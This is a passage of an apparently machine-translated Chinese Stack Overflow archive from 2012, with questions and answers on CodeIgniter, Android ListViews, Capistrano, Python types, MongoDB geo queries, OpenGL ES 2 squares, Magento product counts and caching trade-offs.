            $error = "Category with that name already exists!";
        }
        else {
            $data = array(
                'name' => $categoryName,
                'parent' => $parentCategory
            );
            $this->db->insert('categories', $data);
        }
    }
    else {
        $error = "Category Name can't be empty.";
    }
    if($error != "") {
        return $error;
    }
    else {
        return "Success! Category has been added!";
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T07:10:24.530

重命名`class name Categories to Categories_model`并命名。`file as categories_model.php`您可能无法访问模型文件，因为您在模型文件中输入了错误的类名

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-04T07:09:03.350

das 不被 PHP 识别，所以它默默地失败了`unexpected T_VARIABLE`

```
<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Categories extends CI_Model {

    // Retrieves all category names and id's
    function getCategories() {

    }

    // Add category to database. If there are errors returns message to AJAX controller
    function addCategory() {
        return "yeah";
        $categoryName = $_POST['categoryName'];
        $parentCategory = $_POST["parentCategory"];
        $error = "";
        if(isset($categoryName) && isset($parentCategory) && $categoryName != "") {
            $query = $this->db->get_where("categories", array("name" => $categoryName));
            if($query->num_rows() > 0) {
                $error = "Category with that name already exists!";
            }
            else {
                $data = array(
                    'name' => $categoryName,
                    'parent' => $parentCategory
                );
                $this->db->insert('categories', $data);
            }
        }
        else {
            $error = "Category Name can't be empty.";
        }
        if($error != "") {
            return $error;
        }
        else {
            return "Success! Category has been added!";
        }
    }

} 
```

# javascript - Scala + Play + Akka。是否需要 Backbone.js？

> ID：11806658
> 
> 赞同：9
> 
> 时间：2012-08-04T07:04:49.670
> 
> 标签：javascript, postgresql, scala, google-chrome-extension, redis

我的后端在 Postgres 中。我正在使用 Scala 来构建它的 API。

每次数据库发生更改时，我都希望通知我的 chrome 扩展。我对此有几个问题：

1.  我应该在这里实现 websockets 还是进行长轮询？
2.  如果是 web-sockets，有没有很好的例子说明我如何使用 scala + play + Akka 和 javascript 来做到这一点？
3.  我相信我必须实现一种称为观察者模式的东西，如果数据有任何变化，它会通知我的 chrome 扩展。我应该遵循其他任何模式来以最小的数据库开销完成这样的事情吗？
4.  我应该使用 Redis 还是 RabbitMQ 来处理这个特定的通知部分？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T07:03:30.620

1）我会使用[http://socket.io/](http://socket.io/)

3）这是一个有趣的问题。观察者模式通常用于前端。我建议您查看这篇文章[http://addyosmani.com/largescalejavascript/](http://addyosmani.com/largescalejavascript/)。它帮助我更好地构建我的应用程序。它基本上是 Pub/Sub 模式与 EventBroker/Mediator 之间。理想情况下，将发布者和订阅者解耦。您可以将 EventBroker 放在您的应用程序命名空间中。通过这种方式，您可以从模块访问消息总线，而无需一直通过模块传递引用。

4) 我们在具有类似 pinterest 功能的网站上使用 redis 进行实时/实时通知。我对 redis 的性能印象深刻。

# android - 从与覆盖基本适配器android连接的listview获取检查项目

> ID：11806661
> 
> 赞同：1
> 
> 时间：2012-08-04T07:05:17.180
> 
> 标签：android

我想在 String 数组中获取已检查的项目列表。我已经将 videoList 作为列表视图，并且我已经用它实现了基本适配器并覆盖了 baseadapter 并使用复选框对其进行了自定义。
我已经尝试过了，但它给出了 nullpointerexception。

```
btnplay.setOnClickListener(new View.OnClickListener() 
    {
        SparseBooleanArray sparseBooleanArray = videolist.getCheckedItemPositions();

        @Override
        public void onClick(View v)
        {

            for(int i =0 ; i<videolist.getCount();i++)
            {

                if(sparseBooleanArray.get(i))
                {

                    String str = (String) videolist.getItemAtPosition(sparseBooleanArray.keyAt(i));
                    Toast.makeText(getBaseContext(),str , 3).show();
                }
            }

        }
    });

public class VideoAdapter extends BaseAdapter
{
    private Context vContext;
    public VideoAdapter(Context c) 
    {
        vContext = c;
    }

    @Override
    public int getCount() {
        // TODO Auto-generated method stub
        return count;
    }

    @Override
    public Object getItem(int arg0) {
        // TODO Auto-generated method stub
        return null;
    }

    @Override
    public long getItemId(int arg0) {
        // TODO Auto-generated method stub
        return 0;
    }

    @Override
    public View getView(int position, View convertView, ViewGroup parent) 
    {

        System.gc();
        LayoutInflater inflater = (LayoutInflater) vContext.getSystemService(vContext.LAYOUT_INFLATER_SERVICE);
        View view;
        CheckBox cb;
                String id = null;
        if (convertView == null) 
        {
            view = new View(vContext);  

            view = inflater.inflate(R.layout.row, null);

            cb = (CheckBox) view.findViewById(R.id.checkBox1);

            video_column_index = videocursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID);

            videocursor.moveToPosition(position);

            video_column_index = videocursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME);

            videocursor.moveToPosition(position);

            id = videocursor.getString(video_column_index);

            video_column_index = videocursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE);

            videocursor.moveToPosition(position);

            id += " Size(KB):" + videocursor.getString(video_column_index);

            cb.setText(id);
        } else
              view = convertView;
        return view;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T07:12:02.350

您在这里覆盖了很多重要的函数，并且没有给它们任何实现。

例如，您有：

```
@Override
public Object getItem(int arg0) {
    // TODO Auto-generated method stub
    return null;
} 
```

`ListView`当你总是返回时，你怎么能检索到一个项目`null`？

也许您正在寻求扩展一个更完整的适配器实现。尝试`ArrayAdapter`在不覆盖方法的情况下使用，例如`getItem`使用空实现。您可以轻松搜索如何使用`ArrayAdapter`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-04T07:14:33.890

试试这个。

```
yourCheckBox.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View v) {
                // TODO Auto-generated method stub

                if (cb.isChecked() == true) {
                    String getString = yourCheckBox.get(position).getText; //Here you will get text of checkbox
                    yourList.add(getString);    // Here you have to add your string value to list.                

                }                   
            }
        }); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-09T15:18:55.997

默认情况下，列表视图的选择模式设置为 CHOICE_MODE_SINGLE，因此您需要将选择模式设置为单个或多个，以便 getCheckedItemPositoins() 返回非空 SparseBooleanArray。

希望这对某人有帮助！

# ubuntu - 如何指示 Capistrano 使用 ZSH 而不是 BASH？

> ID：11806662
> 
> 赞同：0
> 
> 时间：2012-08-04T07:05:28.583
> 
> 标签：ubuntu, capistrano, zsh

在部署服务器上，我们将 ZSH 设置为部署用户的默认 shell。在登录时这工作正常，但是当`cap deploy`运行时，它似乎正在执行 bash 而不是 zsh，因为它存在一些无法识别的特定 zsh 命令的问题。这不是一个严重的问题，但我想通过指示部署脚本使用 zsh 而不是 bash 来消除这个问题。这是怎么做到的？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T01:46:30.360

您可以将以下行添加到 deploy.rb

```
default_run_options[:shell] = '/bin/zsh' 
```

# php - 如何用数组中的一些值填充模式

> ID：11806671
> 
> 赞同：0
> 
> 时间：2012-08-04T07:07:36.003
> 
> 标签：php, regex

我有一个 uri 模式，我想用一些值填充它。我只有这两个变量。

```
$pattern = "/^(?P<scope>[a-zA-Z]+)\/(?P<node>[a-zA-Z]+)\/(?P<controller>[a-zA-Z]+)\/(?P<action>[a-zA-Z]+)$/";

$replacement = array('scope'=>'Modules', 'node'=>'Index', 'controller'=>'Index', 'action'=>'index'); 
```

我正在寻找一种方法来获得这个输出：模块/索引/索引/索引

谢谢你 ！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-04-07T09:31:58.923

```
$output = substr($pattern, 2, -2);
$output = stripcslashes($output);
foreach ($replacement as $key => $value)
    $output = str_replace("(?P<$key>[a-zA-Z]+)", $value, $output); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T07:12:57.470

这可能很有用，具体取决于您的 URI，尽管它使用 PHP 的 str_replace 而不是正则表达式 ...

```
$oldURI  = 'blah/<scope>/<node>/<controller>/<action>/';
$search  = array('<scope>','<node>','<controller>','<action>');
$replace = array('Modules','Index','Index','index');
$newURI  = str_replace($search, $replace, $oldURI); 
```

# python - 如何在 Python 中检查当前有效的类型

> ID：11806673
> 
> 赞同：2
> 
> 时间：2012-08-04T07:08:00.777
> 
> 标签：python, typechecking

**背景**：使用 numpy/scipy 从 R 迁移到 Python。尝试制作一些有用功能的小模块。特别是，我正在尝试创建一个递归元素类型检查器。

**问题**：是否可以在 Python 环境中获取正在调用函数的当前有效类型的列表？

例如，`isinstance(1,int)`将返回`True`，`isinstance(1,str)`将返回`False`，但`isinstance(1,asdf)`将抛出一个`NameError: name 'asdf' is not defined`即 int 和 str 已定义，但 asdf 未定义。如何获取已定义的类型列表或当前 Python 环境中存在的名称，并按类型过滤它们？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T08:46:37.500

在 Python 中，类型本身就是普通对象。也就是说，例如，

```
type('hello') == str
type(5) == int
type(int) == type
type(type) == type 
```

都是`True`。

因此，要做到这一点，请在范围内查找指向 type 对象的所有变量`type`。

[要获取范围内的所有对象](https://stackoverflow.com/questions/1041639/get-a-dict-of-all-variables-currently-in-scope-and-their-values)，请查看~~两者`dir()`（不包括内置名称，如`int`）和`dir(__builtins__)`（内置名称）~~ `locals()`（在当前函数中定义的`globals()`变量）、（在当前模块中的函数之外定义的变量）和`vars(__builtins__)`（内置名称）。这些都是来自 name => object 的字典，因此将它们全部组合并获取对象：

```
objs = dict(vars(__builtins__), **dict(globals(), **locals())).values() 
```

并仅过滤类型：

```
types_in_scope = [o for o in objs if isinstance(o, type)] 
```

请注意，这些只是范围内指向类型的*变量。*很有可能引用一个类型未分配给范围内任何变量的对象。例如：

```
def foo():
    class Foo:
        pass
    return Foo()
x = foo() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T07:13:57.353

也许您可以查找`types`模块？请在此处查看文档：http: [//docs.python.org/library/types.html](http://docs.python.org/library/types.html)。您还可以获取程序中的当前变量，如下所示：

```
In [9]: def spam():
            x=5
            y=6

In [10]: spam.func_code.co_varnames
Out[10]: ('x', 'y') 
```

希望它有所帮助，您可以开始使用。对不起，如果我完全偏离了轨道。

# ruby-on-rails - 如何使用工头的 --template 选项定义自定义模板？

> ID：11806682
> 
> 赞同：5
> 
> 时间：2012-08-04T07:09:03.733
> 
> 标签：ruby-on-rails, ruby-on-rails-3, upstart, foreman

在使用`foreman`gem 时，我遇到了一些问题，它不允许我定义自定义模板。

对于我的一个应用程序，我可以定义 ~/.foreman/templates/upstart/master.conf.erb 并且读起来很好。然而，对于另一个项目，无论我尝试什么，我都无法通过 forman upstart 导出正确地唤起模板。

我尝试了许多不同的方法，从使用具有绝对和相对路径的文件定义 -t 和 --template 标志到 ~/.foreman 方法。似乎没有任何效果。

您能否提供一些关于如何使用版本控制目录（例如 config/upstart-master.conf.erb）中的模板定义 -t 标志的演示/场景？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-05-17T15:34:39.067

给`-t`(or `--template`) 的参数必须是包含以下 0、1、2 或全部 3 个的目录：

```
master.conf.erb
process_master.conf.erb
process.conf.erb 
```

而不是文件本身。

[初始功能拉取请求](https://github.com/ddollar/foreman/pull/46)。 [拉取请求以改进文档](https://github.com/ddollar/foreman/pull/363)，因为当前文档仅声明：“指定用于创建导出文件的备用模板。”

# mongodb - 从 MongoDB 获取唯一的 GEO 数据

> ID：11806686
> 
> 赞同：0
> 
> 时间：2012-08-04T07:09:38.553
> 
> 标签：mongodb, geo

我的 Mongo 数据库中有以下 GEO 数据。

```
db.car.ensureIndex({"loc":"2d" , "name" :1})

db.car.save({ "name":"Toyota car", "affiliation":"Toyota", "loc":{"lon":55.93939251390387,"lat":-113.999}})
    db.car.save({"name":"Honda car", "affiliation":"Honda", "loc":{"lon":58.93939251390387,"lat":-113.999}})
    db.car.save({"name":"Skoda", "affiliation":"Skoda", "loc":{"lon":52.93939251390387,"lat":-113.999}})
    db.car.save({"name":"Ford", "affiliation":"Ford", "loc":{"lon":45.93939251390387,"lat":-113.999}})
    db.car.save({"name":"Audi SUV", "affiliation":"Audi", "loc":{"lon":35.93939251390387,"lat":-113.999}})
    db.car.save({"name":"Benz", "affiliation":"Benz", "loc":{"lon":75.93939251390387,"lat":-113.999}})
    db.car.save({"name":"Skoda", "affiliation":"Skoda", "loc":{"lon":50.93939251390387,"lat":-113.999}})
    db.car.save({"name":"Benz", "affiliation":"Skoda", "loc":{"lon":51.93939251390387,"lat":-113.999}})
    db.car.save({"name":"Skoda SUV", "affiliation":"Skoda", "loc":{"lon":50.93939251390387,"lat":-113.999}})
    db.car.save({"name":"Honda", "affiliation":"Skoda", "loc":{"lon":55.93939251390387,"lat":-113.999}}) 
```

我正在尝试为给定的收音机获取最接近的“名称”。

当我运行以下查询时

```
db.car.find({"loc" : {"$within" : {"$center" : [[50.93939251390,-114],5]}}}) 
```

我明白了

```
enter code here

> db.car.find({"loc" : {"$within" : {"$center" : [[50.93939251390,-114],5]}}})
{ "_id" : ObjectId("501cc07eebb626e104d5a23b"), "name" : "Skoda", "affiliation" : "Skoda", "loc" : { "lon" : 50.93939251390387, "lat" : -113.999 } }
{ "_id" : ObjectId("501cc07eebb626e104d5a237"), "name" : "Skoda", "affiliation" : "Skoda", "loc" : { "lon" : 52.93939251390387, "lat" : -113.999 } }
{ "_id" : ObjectId("501cc07eebb626e104d5a23c"), "name" : "Benz", "affiliation" : "Skoda", "loc" : { "lon" : 51.93939251390387, "lat" : -113.999 } }
{ "_id" : ObjectId("501cc07febb626e104d5a23d"), "name" : "Skoda SUV", "affiliation" : "Skoda", "loc" : { "lon" : 50.93939251390387, "lat" : -113.999 } } 
```

但我想检索半径中的唯一“名称”，如下所示。

```
> db.car.find({"loc" : {"$within" : {"$center" : [[50.93939251390,-114],5]}}})
{ "_id" : ObjectId("501cc07eebb626e104d5a23b"), "name" : "Skoda", "affiliation" : "Skoda", "loc" : { "lon" : 50.93939251390387, "lat" : -113.999 } }
{ "_id" : ObjectId("501cc07eebb626e104d5a23c"), "name" : "Benz", "affiliation" : "Skoda", "loc" : { "lon" : 51.93939251390387, "lat" : -113.999 } }
{ "_id" : ObjectId("501cc07febb626e104d5a23d"), "name" : "Skoda SUV", "affiliation" : "Skoda", "loc" : { "lon" : 50.93939251390387, "lat" : -113.999 } } 
```

如何在其中添加约束？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T12:58:06.093

您不能将这种分组约束添加到您的查询中（至少对于 MongoDB 2.0.x），因此您必须在应用程序代码中迭代结果以提取您需要的内容。

假设以下情况创建了一个示例：

*   跟踪给定名称的匹配数会很有用
*   您只想包含给定名称的最接近匹配项的详细信息
*   MongoDB [geoNear()](http://www.mongodb.org/display/DOCS/Geospatial+Indexing/#GeospatialIndexing-geoNearCommand)按距离排序，所以第一个匹配应该是最近的

这是使用 JS 外壳：

```
// Hash to save results
> var cars = {}

// Find closest cars to given geo point using geoNear
>   db.runCommand(
        { geoNear: 'car', near : [50.93939251390,-114], num:5}
    ).results.forEach(
        function(doc) {
            if (cars[doc.obj.name]) {
                // Increment number of matches for this name
                cars[doc.obj.name]['matches'] = cars[doc.obj.name]['matches'] + 1;
            } else {
                // Closest match found
                doc.obj['matches'] = 1;
                doc.obj['distance'] = doc.dis;
                cars[doc.obj.name] = doc.obj;
            }
        }
    )

// Check the results
> cars
{
    "Skoda" : {
        "_id" : ObjectId("501d108c9d2b5b2b5443712d"),
        "name" : "Skoda",
        "affiliation" : "Skoda",
        "loc" : {
            "lon" : 50.93939251390387,
            "lat" : -113.999
        },
        "matches" : 2,
        "distance" : 0.0010000000000047748
    },
    "Skoda SUV" : {
        "_id" : ObjectId("501d108c9d2b5b2b5443712f"),
        "name" : "Skoda SUV",
        "affiliation" : "Skoda",
        "loc" : {
            "lon" : 50.93939251390387,
            "lat" : -113.999
        },
        "matches" : 1,
        "distance" : 0.0010000000000047748
    },
    "Benz" : {
        "_id" : ObjectId("501d108c9d2b5b2b5443712e"),
        "name" : "Benz",
        "affiliation" : "Skoda",
        "loc" : {
            "lon" : 51.93939251390387,
            "lat" : -113.999
        },
        "matches" : 1,
        "distance" : 1.0000005000037404
    },
    "Ford" : {
        "_id" : ObjectId("501d108c9d2b5b2b5443712a"),
        "name" : "Ford",
        "affiliation" : "Ford",
        "loc" : {
            "lon" : 45.93939251390387,
            "lat" : -113.999
        },
        "matches" : 1,
        "distance" : 5.000000099996134
    }
} 
```

这种搜索结果的一种常见方法是显示在列表中找到的所有匹配项，并将它们绘制在地图上。理想情况下，您的地图视图将支持某种[标记聚类](http://code.google.com/p/google-maps-utility-library-v3/wiki/Libraries#MarkerClusterer)，以根据用户选择的缩放级别自动对标记进行分组。

# jquery - jquery ui droppable贪婪不起作用

> ID：11806689
> 
> 赞同：1
> 
> 时间：2012-08-04T07:10:00.067
> 
> 标签：jquery, html, jquery-ui

我有一个这样的html结构

```
<div id='dropzone'>
<ul id='filelist'>
<li class='fileitem'></li>
<li......
....
....
</ul>
</div> 
```

Jquery UI droppables 是

```
$('#dropzone').droppable();
$('.fileitem').droppable({greedy:true}); 
```

***在dropzone***上删除文件工作正常。现在**我的问题**是我想将***一个文件项放在另一个文件项上***它不起作用，当我尝试这样做时，它*就像我正在将文件项放在 dropzone 上一样*。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T11:17:48.737

我做了一个小[演示](http://jsfiddle.net/tonybo/f5EbX/72/)。这与文件无关，因为您对它们没有问题，而是关于可拖动和可放置对象，包括贪婪的可放置对象。

我想你动态地创建你的 li 元素，所以不要忘记用 droppable() 调用动态地初始化它们。注意 initLIObject 函数，它不仅在静态 li 对象上调用，而且在动态创建的 li 对象上调用。

EDIT1：看看[这个问题](https://stackoverflow.com/questions/5612250/jquery-ui-droppable) 和[这个问题](https://stackoverflow.com/questions/1663741/is-there-a-good-jquery-drag-and-drop-file-upload-plugin)

# android - Android OpenGL ES 2，绘制方块

> ID：11806690
> 
> 赞同：28
> 
> 时间：2012-08-04T07:10:06.393
> 
> 标签：android, opengl-es-2.0

***编辑：问题解决了！*** 因此，我一直在阅读适用于 Android 的官方 OpenGL ES 2 教程，并且已经了解了涉及绘制形状的部分，但我似乎无法使用正方形。它改为绘制一个直角三角形。

我已经包含了我用来定义和绘制形状的代码，它几乎完全是从教程中复制的。Renderer 类只是创建这个形状的一个实例并调用 draw 方法。

出于某种原因，本教程没有给出 vertexStride 和 vertexCount 的值/声明，所以我在其中的那些是有根据的猜测。我已经尝试了 vertexCount 的几个值（1 到 12），但没有一个工作。

提前致谢。

```
 public class Square {

                private FloatBuffer vertexBuffer;
                private ShortBuffer drawListBuffer;

                // number of coordinates per vertex in this array
                static final int COORDS_PER_VERTEX = 3;
                static float squareCoords[] = { -0.5f,  0.5f, 0.0f,   // top left
                                                -0.5f, -0.5f, 0.0f,   // bottom left
                                                 0.5f, -0.5f, 0.0f,   // bottom right
                                                 0.5f,  0.5f, 0.0f }; // top right

                private short drawOrder[] = { 0, 1, 2, 0, 2, 3 }; // order to draw vertices
                float color[] = { 0.63671875f, 0.76953125f, 0.22265625f, 1.0f };

                private final String vertexShaderCode =
                        "attribute vec4 vPosition;" +
                        "void main() {" +
                        "  gl_Position = vPosition;" +
                        "}";

                private final String fragmentShaderCode =
                    "precision mediump float;" +
                    "uniform vec4 vColor;" +
                    "void main() {" +
                    "  gl_FragColor = vColor;" +
                    "}";

                int mProgram;

                static final int vertexStride = COORDS_PER_VERTEX * 4;
                static final int vertexCount = 4;

                public Square() {
                    // initialize vertex byte buffer for shape coordinates
                    ByteBuffer bb = ByteBuffer.allocateDirect(squareCoords.length * 4); // (# of coordinate values * 4 bytes per float)
                    bb.order(ByteOrder.nativeOrder());
                    vertexBuffer = bb.asFloatBuffer();
                    vertexBuffer.put(squareCoords);
                    vertexBuffer.position(0);

                    // initialize byte buffer for the draw list
                    ByteBuffer dlb = ByteBuffer.allocateDirect(drawOrder.length * 2); // (# of coordinate values * 2 bytes per short)
                    dlb.order(ByteOrder.nativeOrder());
                    drawListBuffer = dlb.asShortBuffer();
                    drawListBuffer.put(drawOrder);
                    drawListBuffer.position(0);

                    int vertexShader = loadShader(GLES20.GL_VERTEX_SHADER, vertexShaderCode);
                    int fragmentShader = loadShader(GLES20.GL_FRAGMENT_SHADER, fragmentShaderCode);

                    mProgram = GLES20.glCreateProgram();             // create empty OpenGL ES Program
                    GLES20.glAttachShader(mProgram, vertexShader);   // add the vertex shader to program
                    GLES20.glAttachShader(mProgram, fragmentShader); // add the fragment shader to program
                    GLES20.glLinkProgram(mProgram);                  // creates OpenGL ES program executables
                }

                public static int loadShader(int type, String shaderCode){

                    // create a vertex shader type (GLES20.GL_VERTEX_SHADER)
                    // or a fragment shader type (GLES20.GL_FRAGMENT_SHADER)
                    int shader = GLES20.glCreateShader(type);

                    // add the source code to the shader and compile it
                    GLES20.glShaderSource(shader, shaderCode);
                    GLES20.glCompileShader(shader);

                    return shader;
                }

                public void draw() {
                    // Add program to OpenGL ES environment
                    GLES20.glUseProgram(mProgram);

                    // get handle to vertex shader's vPosition member
                    int mPositionHandle = GLES20.glGetAttribLocation(mProgram, "vPosition");

                    // Enable a handle to the triangle vertices
                    GLES20.glEnableVertexAttribArray(mPositionHandle);

                    // Prepare the triangle coordinate data
                    GLES20.glVertexAttribPointer(mPositionHandle, COORDS_PER_VERTEX,
                                                 GLES20.GL_FLOAT, false,
                                                 vertexStride, vertexBuffer);

                    // get handle to fragment shader's vColor member
                    int mColorHandle = GLES20.glGetUniformLocation(mProgram, "vColor");

                    // Set color for drawing the triangle
                    GLES20.glUniform4fv(mColorHandle, 1, color, 0);

                    // Draw the triangle
                    GLES20.glDrawArrays(GLES20.GL_TRIANGLES, 0, vertexCount);

                    // Disable vertex array
                    GLES20.glDisableVertexAttribArray(mPositionHandle);
                }
            } 
```

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-08-04T21:53:02.360

```
vertexCount = squareCoords.length/COORDS_PER_VERTEX; //Vertex count is the array divided by the size of the vertex ex. (x,y) or (x,y,z) 
vertexStride = COORDS_PER_VERTEX * 4;                //4 are how many bytes in a float 
```

让我知道这是否适合你，祝你好运。

我认为您还缺少`ModelViewProjection`用于将 3D 空间转换为 2D 屏幕空间的矩阵。mvpMatrix 应该由 draw 函数传入`draw(float[] mvpMatrix)` 忘了提到你也应该使用`DrawElements(...)`（在示例中使用）如果你不需要计数或步幅，只需要一个 idicies 数组的长度和一个绘图缓冲区。

```
 // Get handle to shape's transformation matrix
    mMVPMatrixHandle = GLES20.glGetUniformLocation(mProgram, "uMVPMatrix");

    // Apply the projection and view transformation
    GLES20.glUniformMatrix4fv(mMVPMatrixHandle, 1, false, mvpMatrix, 0);

    // Draw the square
    GLES20.glDrawElements(GLES20.GL_TRIANGLES, drawOrder.length,
                          GLES20.GL_UNSIGNED_SHORT, drawListBuffer); 
```

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2016-08-30T04:38:29.540

本教程缺少一些步骤：[正方形的最终代码在这里](https://android.googlesource.com/platform/development/+/master/samples/OpenGL/HelloOpenGLES20/src/com/example/android/opengl/Square.java)。

该示例旨在使用以下行`glDrawElements`来代替`glDrawArrays`它：`private short drawOrder[] = { 0, 1, 2, 0, 2, 3 }; // order to draw vertices`.

此数组指定 2 个三角形的所需顶点。第一个是 0、1 和 2。然后是第二个 0、2 和 3。`GL_TRANGLE_FAN`恰好可以工作，因为它将使用缓冲区中的第一个顶点、前一个三角形中使用的最后一个顶点和下一个顶点来绘制下一个三角形。对于第二个三角形，这是 0、2 和 3。然后是 0、3 和 4，等等。如果顶点 2 为 5、5，顶点 3 为 -5、5，则生成的扇形不会是正方形。

替换这些行：

```
// Draw the triangle
GLES20.glDrawArrays(GLES20.GL_TRIANGLES, 0, vertexCount); 
```

用这些：

```
// Draw the square
GLES20.glDrawElements(
    GLES20.GL_TRIANGLES, drawOrder.length,
    GLES20.GL_UNSIGNED_SHORT, drawListBuffer); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-04-11T23:46:17.067

@Jon W 我认为 GL_TRIANGLES 和 GL_TRIANGLE_FAN 之间的区别在图片中进行了解释：

[http://www.google.fr/imgres?imgurl=http://www.naturewizard.com/Tutorials/Tutorial01/images/image009.jpg&imgrefurl=http://www.naturewizard.com/tutorial0104.html&h=719&w= 604&sz=55&tbnid=15KBWSk5xZO7YM:&tbnh=90&tbnw=76&zoom=1&usg=__o554PpZhRv8TM8JTmLC9FpU7_ko=&docid=ELETRFsqMmNrvM&sa=X&ei=F0hnUcK9BMPA0QWn2oDABw​​&ved=0CEIQ59QEwAQQ2](http://www.google.fr/imgres?imgurl=http://www.naturewizard.com/Tutorials/Tutorial01/images/image009.jpg&imgrefurl=http://www.naturewizard.com/tutorial0104.html&h=719&w=604&sz=55&tbnid=15KBWSk5xZO7YM:&tbnh=90&tbnw=76&zoom=1&usg=__o554PpZhRv8TM8JTmLC9FpU7_ko=&docid=ELETRFsqMmNrvM&sa=X&ei=F0hnUcK9BMPA0QWn2oDABw&ved=0CEIQ9QEwAQ&dur=255)

# magento - Magento 如何使用静态块上的 id 获取类别中的产品总数......以及限制网格中显示的产品数量

> ID：11806692
> 
> 赞同：0
> 
> 时间：2012-08-04T07:10:32.117
> 
> 标签：magento

我使用 Magento CE 1.6.2 ..

我在静态页面上显示来自三个不同类别的产品。我创建了 list.phtml 的副本，从中删除了工具栏并将其重命名为 listHome_noToolbar.phtml

我通过使用以下代码来实现这一点：

```
{{block type="catalog/product_list" name="home.catalog.product.listHome_noToolbar" alias="products_by_category" category_id="37" num_products="4" column_count="4" template="catalog/product/listHome_noToolbar.phtml"}}

{{block type="catalog/product_list" name="home.catalog.product.listHome_noToolbar" alias="products_by_category" category_id="38" num_products="4" column_count="4" template="catalog/product/listHome_noToolbar.phtml"}}

{{block type="catalog/product_list" name="home.catalog.product.listHome_noToolbar" alias="products_by_category" category_id="39" num_products="4" column_count="4" template="catalog/product/listHome_noToolbar.phtml"}} 
```

我知道类别 ID，因此我使用它在网格中显示产品。

现在，我想要关于以下内容的建议和意见：

1.我想在商品展示之前找出并展示类别id=37的商品数量。此显示必须仅在静态页面/cms 页面上。我可以使用什么代码以及如何做到这一点？

2\. 我在这个静态页面上调用了 3 个单独的类别产品网格。我一直在尝试仅使用 num_products="4" 将每个网格中显示的产品限制为 4，但这在某种程度上是行不通的。我怎样才能做到这一点？我一直认为 num_products 有效！！！！

我查看了许多提供的解决方案，但似乎没有谈论限制自定义列表或网格中显示的产品数量。

这不知何故没有工作......出现致命错误...... [Magento限制主页中的产品数量](https://stackoverflow.com/questions/6760352/magento-limit-number-of-products-in-home-page)

我不想更改 Magento 后端的产品数量……因为这会影响显示所有产品的其他 GRID。

任何帮助和指导将不胜感激......

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-06T08:51:30.163

找到 Qs.1 的答案“找出并显示类别 id=37 中的产品数量”

想在这里分享一下：

在 listHome_noToolbar.phtml 文件中，在需要显示产品数量的位置添加以下代码行。

注意：您可以在 list.phtml 文件中添加以下代码，只要您希望产品数量可见。

```
<?php $_productCollection = $this->getLoadedProductCollection(); 
$count = $_productCollection->getSize(); 
echo $count; ?> 
```

希望这对任何人都有帮助:-)

# python - 哪个更贵（以美元计）：数据库内存或处理能力？

> ID：11806700
> 
> 赞同：3
> 
> 时间：2012-08-04T07:12:34.923
> 
> 标签：python, postgresql, heroku, hosting

这是一个相当抽象的问题，我希望它在范围内。

我在网络开发方面的编码生涯大约有 5 个月的时间。我发现 CPU 和存储资源之间经常存在紧张关系。简而言之，您可以少用一个，多用另一个，反之亦然（然后考虑速度）。我现在要部署我的第一个应用程序进行生产，所以这个平衡现在是真正的美元和美分的问题。事情是这样的：我真的不知道我应该寻找什么样的平衡*。*

这里有一些突出的例子可能会阐明在不同情况下要达到的平衡。

**背景**

我正在开发一个在文本之间有很多差异的应用程序。用户将调用包含以 html 显示的差异的页面。很多。

**第一个案例**

我应该在每次显示页面时运行差异，还是应该运行一次差异，存储它，并在每次显示页面时调用它？

**第二种情况**

我编写了一个总结差异的算法。它大约有 110 行代码，它使用 4 或 5 个循环和子循环。同样，我应该运行一次并存储结果，以便以后可以调用它们，还是应该在每次显示页面时只运行算法？

也很想听听您对用于量化余额的最佳工具的看法。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-04T07:36:57.397

如果不进行测试很难回答，但您可能想回答以下问题：

1) diff 操作的成本是多少？运行测试或计算复杂度。如果差异操作是针对非常大的文件或快速更改的文件，您可能需要修改算法。如果文件很大、变化很小或随着时间的推移快速变化，那么存储差异似乎不是一个很好的解决方案。

2）您需要多少次使用相同的文件生成相同的差异，是否有与此相关的时间限制？- 如果在短时间内反复生成相同的差异，您可能希望将其缓存而不是将其写入数据库。如果随着时间的推移（几天、几个月）偶尔访问差异，您可能希望在分析上述 1 之后存储它。

您可以在 Amazon Web Services 上使用成本进行基准测试。你再次在那里有选择。您可以只使用单个 EC2 实例来处理所有事情，也可以针对 RDS、EC2 和 S3 拆分工作流，然后分析成本。取决于你想要的规模水平。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-04T07:40:14.873

你问的基本上是你应该缓存还是不应该缓存。缓存在大多数情况下是可取的，但您应该限制缓存大小。当缓存已满时，应从缓存中删除最近访问的最少项目，以便为最近访问的项目腾出位置。

少量的缓存通常可以大大降低 CPU 负载。

你不妨看看[memcache](https://addons.heroku.com/memcache)

Memcache 为您实现了自动删除旧项目以支持新项目。您所要做的就是在生成数据时将其放入缓存中，当您需要数据时首先检查 memcache 是否还有它，如果没有，然后生成它。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-04T14:09:43.533

